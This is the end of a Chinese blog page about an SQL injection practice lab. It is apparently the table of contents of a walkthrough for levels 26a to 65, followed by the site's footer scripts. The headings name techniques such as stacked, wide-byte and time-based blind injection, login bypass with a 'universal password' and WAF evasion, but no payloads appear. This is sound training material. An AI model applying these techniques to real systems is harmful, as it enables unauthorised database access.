href="#26a%E5%85%B3%EF%BC%9A%E9%97%AD%E5%90%88%E5%A4%9A%E4%B8%80%E4%B8%AA%E6%8B%AC%E5%8F%B7-%E2%80%98-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.28.</span> <span class="toc-text">26a关：闭合多一个括号 ‘) 报错注入，显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27%E5%85%B3%EF%BC%9A%E8%BF%87%E6%BB%A4-%E5%85%B3%E9%94%AE%E5%AD%97-union-%E5%92%8C-select-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.29.</span> <span class="toc-text">27关：过滤 关键字 union 和 select 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27a%E5%85%B3%EF%BC%9A%E5%8F%AA%E6%98%AF%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%8D%E4%B8%80%E6%A0%B7-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.30.</span> <span class="toc-text">27a关：只是闭合方式不一样 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28%E5%85%B3%EF%BC%9A%E8%BF%87%E6%BB%A4-union-select-%E7%BB%84%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.31.</span> <span class="toc-text">28关：过滤 union select 组合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29%E5%85%B3%EF%BC%9A%E6%9C%89WAF-%E5%AF%B9%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8C%E9%AB%98%E6%95%88%E8%BF%87%E6%BB%A4"><span class="toc-number">4.32.</span> <span class="toc-text">29关：有WAF 对参数进行高效过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88%EF%BC%8C%E6%9C%89WAF-%E9%AB%98%E6%95%88%E8%BF%87%E6%BB%A4"><span class="toc-number">4.33.</span> <span class="toc-text">30关：” 闭合，有WAF　高效过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#31%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88%EF%BC%8C%E6%9C%89WAF"><span class="toc-number">4.34.</span> <span class="toc-text">31关：”) 闭合，有WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E5%85%B3%EF%BC%9A%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%EF%BC%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%82%E6%95%B0%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">4.35.</span> <span class="toc-text">32关：单引号闭合，单引号参数被转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33%E5%85%B3%EF%BC%9A%E4%B8%8E32%E4%B8%80%E6%A8%A1%E4%B8%80%E6%A0%B7"><span class="toc-number">4.36.</span> <span class="toc-text">33关：与32一模一样</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34%E5%85%B3%EF%BC%9APOST-%E2%80%98-%E9%97%AD%E5%90%88-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.37.</span> <span class="toc-text">34关：POST  ‘ 闭合 宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.38.</span> <span class="toc-text">35关：数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.39.</span> <span class="toc-text">36关：’ 闭合 宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37%E5%85%B3%EF%BC%9APOST-%E2%80%98-%E9%97%AD%E5%90%88-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.40.</span> <span class="toc-text">37关：POST   ‘ 闭合 宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E2%80%99"><span class="toc-number">4.41.</span> <span class="toc-text">38关：’ 闭合 堆叠注入’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#39%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.42.</span> <span class="toc-text">39关：数字型 堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.43.</span> <span class="toc-text">40关：’) 闭合 堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.44.</span> <span class="toc-text">41关：数字型  堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42%E5%85%B3%EF%BC%9APOST-%E5%AF%86%E7%A0%81%E5%A4%84-%E2%80%98-%E9%97%AD%E5%90%88-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.45.</span> <span class="toc-text">42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43%E5%85%B3%EF%BC%9A%E7%94%A8%E6%88%B7%E5%A4%84%E6%9C%89%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%AF%86%E7%A0%81%E5%A4%84-%E2%80%98-%E9%97%AD%E5%90%88-%E4%BD%BF%E7%94%A8%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E3%80%82%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.46.</span> <span class="toc-text">43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44%E5%85%B3%EF%BC%9A%E5%90%8C43%E5%85%B3%EF%BC%8C%E5%AF%86%E7%A0%81%E5%A4%84-%E2%80%98-%E9%97%AD%E5%90%88-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.47.</span> <span class="toc-text">44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45%E5%85%B3%EF%BC%9A%E5%90%8C43%E5%85%B3%EF%BC%8C%E7%94%A8%E6%88%B7%E5%A4%84%E6%9C%89%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%AF%86%E7%A0%81%E5%A4%84-%E2%80%98-%E9%97%AD%E5%90%88-%E4%BD%BF%E7%94%A8%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E3%80%82%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.48.</span> <span class="toc-text">45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46%E5%85%B3%EF%BC%9A%E6%98%BE%E7%A4%BA%E8%A1%A8%E5%8D%95-%E6%95%B0%E5%AD%97%E5%9E%8B-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.49.</span> <span class="toc-text">**46关：显示表单 数字型 报错注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47%E5%85%B3%EF%BC%9A%E6%98%BE%E7%A4%BA%E8%A1%A8%E5%8D%95-%E2%80%98-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.50.</span> <span class="toc-text">**47关：显示表单  ‘ 闭合  报错注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E5%8F%AF%E5%B0%9D%E8%AF%95-DNS-log%E6%B3%A8%E5%85%A5"><span class="toc-number">4.51.</span> <span class="toc-text">**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#49%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.52.</span> <span class="toc-text">49关：’ 闭合 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#50%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.53.</span> <span class="toc-text">**50关：数字型注入 报错注入 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#51%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.54.</span> <span class="toc-text">51关：’ 闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.55.</span> <span class="toc-text">52关：数字型注入 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.56.</span> <span class="toc-text">53关：’ 闭合 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#54-65%E5%85%B3-%E8%A6%81%E6%B1%82%E5%9C%A8%E9%99%90%E5%AE%9A%E6%AD%A5%E6%95%B0%E5%86%85%E5%AE%8C%E6%88%90%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%9B%B4%E7%BB%95-challenge-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.57.</span> <span class="toc-text">54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#54%E5%85%B3%EF%BC%9A%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E2%80%98-%E9%97%AD%E5%90%88"><span class="toc-number">4.58.</span> <span class="toc-text">**54关：显错注入 ‘ 闭合 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#55%E5%85%B3%EF%BC%9A%EF%BC%89%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.59.</span> <span class="toc-text">55关：）闭合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#56%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.60.</span> <span class="toc-text">56关：’) 闭合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#57%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.61.</span> <span class="toc-text">57关：” 闭合 显错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.62.</span> <span class="toc-text">58关：’  闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#59%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.63.</span> <span class="toc-text">59关：数字型注入 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#60%E5%85%B3%EF%BC%9A%E2%80%9D%EF%BC%89%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.64.</span> <span class="toc-text">60关：”）闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#61%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.65.</span> <span class="toc-text">61关：’))  闭合 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.66.</span> <span class="toc-text">62关：’)  闭合 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63%E5%85%B3%EF%BC%9A%E2%80%99-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.67.</span> <span class="toc-text">**63关：’ 闭合 时间盲注 **</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E5%85%B3%EF%BC%9A%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.68.</span> <span class="toc-text">64关：数字型注入  时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#65%E5%85%B3%EF%BC%9A%E2%80%9D-%E9%97%AD%E5%90%88-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.69.</span> <span class="toc-text">65关：”) 闭合 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B-payload"><span class="toc-number">5.</span> <span class="toc-text">一些 payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">6.</span> <span class="toc-text">sqlmap 注入过程详解</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i class="fa-fw fas fa-heart card-announcement-animation cc_pointer"></i> MTRleed</div><div class="footer_custom_text">MTRleed|博客</div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2021,08,30,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='小 破 站 已 艰 难 营 业 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'DAdNksl9t4AvRRqv5LSI68Bw-gzGzoHsz',
      appKey: 'DxK0hMCcbzgfiNRktvLAWocH',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      placeholder: 'ヾﾉ≧∀≦)o 欢 迎 评 论 ! 填写QQ邮箱我就可以看到你的头像嗷~',
      path: window.location.pathname,
      master: '0e249a5357be07e34f42012d615f91c8',
      tagMeta:["博主","小伙伴","访客"],
      friends: ["5c0ed793d43436a166548845c8ffe455","d4f239a7347311d21f9658a44bc2d3f1"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>